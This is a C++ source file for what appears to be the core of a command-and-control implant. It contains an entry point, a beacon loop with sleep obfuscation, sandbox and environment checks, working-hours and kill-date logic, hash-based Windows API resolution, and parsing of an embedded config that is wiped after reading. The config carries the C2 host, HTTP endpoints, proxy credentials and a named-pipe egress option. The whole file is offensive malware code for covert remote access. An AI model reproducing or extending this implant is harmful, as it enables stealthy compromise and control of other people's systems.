#include <core/corelib.hpp>

VOID Entrypoint(HMODULE Base) {
    Memory::ContextInit();
    Implant::MainRoutine();
}

namespace Implant {
    TXT_SECTION(F) BYTE ConfigBytes[1024] = {
        0xDE,0xAD,0xBE,0xEF, 0xDE,0xAD,0xBE,0xEF,
    };

    VOID MainRoutine() {
        HEXANE

        Memory::ResolveApi();
        if (ntstatus != ERROR_SUCCESS) {
            return_defer(ntstatus);
        }

        Implant::ReadConfig();

        do {
            Opsec::SleepObf();
            Opsec::SeRuntimeCheck();

            if (!Opsec::CheckTime()) {
                continue;
            }

            if (!Ctx->Session.Checkin) {
                Opsec::SeCheckEnvironment();
                if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                    return_defer(ntstatus);
                }
            }

            Message::MessageTransmit();
            if (ntstatus != ERROR_SUCCESS) {
                Ctx->Session.Retry++;

                if (Ctx->Session.Retry == 3) {
                    break;
                }
            }
            else {
                Ctx->Session.Retry = 0;
            }
        }
        while (TRUE);

    defer:
        FreeApi(Ctx);
    }


    VOID ReadConfig() {
        HEXANE

        PARSER Parser = { };
        Parser::CreateParser(&Parser, ConfigBytes, sizeof(ConfigBytes));
        x_memset(ConfigBytes, 0, sizeof(ConfigBytes));

        //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);

        __debugbreak();
        Ctx->LE     = Parser::UnpackByte(&Parser);
        Ctx->Root   = Parser::UnpackByte(&Parser);
        Parser::ParserMemcpy(&Parser, &Ctx->Config.Key, nullptr);

        if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
            if (
                !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                !(Ctx->Modules.winhttp = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                !(Ctx->Modules.advapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                !(Ctx->Modules.iphl = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
                return_defer(ERROR_MOD_NOT_FOUND);
            }
        }
        else {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if (
            !(FPTR(Ctx->win32.WinHttpOpen, Ctx->Modules.winhttp, WINHTTPOPEN)) ||
            !(FPTR(Ctx->win32.WinHttpConnect, Ctx->Modules.winhttp, WINHTTPCONNECT)) ||
            !(FPTR(Ctx->win32.WinHttpOpenRequest, Ctx->Modules.winhttp, WINHTTPOPENREQUEST)) ||
            !(FPTR(Ctx->win32.WinHttpAddRequestHeaders, Ctx->Modules.winhttp, WINHTTPADDREQUESTHEADERS)) ||
            !(FPTR(Ctx->win32.WinHttpSetOption, Ctx->Modules.winhttp, WINHTTPSETOPTION)) ||
            !(FPTR(Ctx->win32.WinHttpGetProxyForUrl, Ctx->Modules.winhttp, WINHTTPGETPROXYFORURL)) ||
            !(FPTR(Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, Ctx->Modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER)) ||
            !(FPTR(Ctx->win32.WinHttpSendRequest, Ctx->Modules.winhttp, WINHTTPSENDREQUEST)) ||
            !(FPTR(Ctx->win32.WinHttpReceiveResponse, Ctx->Modules.winhttp, WINHTTPRECEIVERESPONSE)) ||
            !(FPTR(Ctx->win32.WinHttpReadData, Ctx->Modules.winhttp, WINHTTPREADDATA)) ||
            !(FPTR(Ctx->win32.WinHttpQueryHeaders, Ctx->Modules.winhttp, WINHTTPQUERYHEADERS)) ||
            !(FPTR(Ctx->win32.WinHttpQueryDataAvailable, Ctx->Modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
            !(FPTR(Ctx->win32.WinHttpCloseHandle, Ctx->Modules.winhttp, WINHTTPCLOSEHANDLE)) ||
            !(FPTR(Ctx->win32.GetAdaptersInfo, Ctx->Modules.iphl, GETADAPTERSINFO)) ||

            !(FPTR(Ctx->win32.CryptStringToBinaryA, Ctx->Modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
            !(FPTR(Ctx->win32.CryptBinaryToStringA, Ctx->Modules.crypt32, CRYPTBINARYTOSTRINGA)) ||

            !(FPTR(Ctx->win32.GetUserNameA, Ctx->Modules.advapi, GETUSERNAMEA)) ||
            !(FPTR(Ctx->win32.LookupAccountSidW, Ctx->Modules.advapi, LOOKUPACCOUNTSIDW)) ||
            !(FPTR(Ctx->win32.LookupPrivilegeValueA, Ctx->Modules.advapi, LOOKUPPRIVILEGEVALUEA)) ||
            !(FPTR(Ctx->win32.SetEntriesInAclA, Ctx->Modules.advapi, SETENTRIESINACLA)) ||
            !(FPTR(Ctx->win32.AllocateAndInitializeSid, Ctx->Modules.advapi, ALLOCATEANDINITIALIZESID)) ||
            !(FPTR(Ctx->win32.AddMandatoryAce, Ctx->Modules.advapi, ADDMANDATORYACE)) ||
            !(FPTR(Ctx->win32.InitializeSecurityDescriptor, Ctx->Modules.advapi, INITIALIZESECURITYDESCRIPTOR)) ||
            !(FPTR(Ctx->win32.InitializeAcl, Ctx->Modules.advapi, INITIALIZEACL)) ||
            !(FPTR(Ctx->win32.SetSecurityDescriptorDacl, Ctx->Modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
            !(FPTR(Ctx->win32.SetSecurityDescriptorSacl, Ctx->Modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
            !(FPTR(Ctx->win32.FreeSid, Ctx->Modules.advapi, FREESID))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname, nullptr);

        Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
        Ctx->Config.Sleeptime       = Parser::UnpackDword(&Parser);
        Ctx->Config.Jitter          = Parser::UnpackDword(&Parser);
        Ctx->Config.WorkingHours    = Parser::UnpackDword(&Parser);
        Ctx->Config.Killdate        = Parser::UnpackDword64(&Parser);

        Ctx->Transport.OutboundQueue = nullptr;

#ifdef TRANSPORT_HTTP
        Ctx->Transport.http = S_CAST(PHTTP_CONTEXT, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP_CONTEXT)));

        Ctx->Transport.http->Handle     = nullptr;
        Ctx->Transport.http->Endpoints  = nullptr;
        Ctx->Transport.http->Headers    = nullptr;

        Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Useragent, nullptr);
        Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Address, nullptr  );

        Ctx->Transport.http->Port       = S_CAST(INT, Parser::UnpackDword(&Parser));
        Ctx->Transport.http->nEndpoints = Parser::UnpackDword(&Parser);
        Ctx->Transport.http->Endpoints  = S_CAST(LPWSTR*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2)));

        for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i], nullptr);
        }

        Ctx->Transport.http->Endpoints[Ctx->Transport.http->nEndpoints + 1] = nullptr;
        Ctx->Transport.bProxy = Parser::UnpackBool(&Parser);

        Parser::ParserStrcpy(&Parser, &Ctx->Transport.Domain, nullptr  );

        if (Ctx->Transport.bProxy) {
            Ctx->Transport.http->Access = INTERNET_OPEN_TYPE_PROXY;

            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyAddress, nullptr );
            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyUsername, nullptr );
            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyPassword, nullptr );

        } else {
            Ctx->Transport.http->ProxyUsername = nullptr;
            Ctx->Transport.http->ProxyPassword = nullptr;
        }
#endif
#ifdef TRANSPORT_PIPE
        Parser::ParserWcscpy(&Parser, &Ctx->ConfigBytes.EgressPipename, nullptr);
#endif
    defer:
        Parser::DestroyParser(&Parser);
    }
}

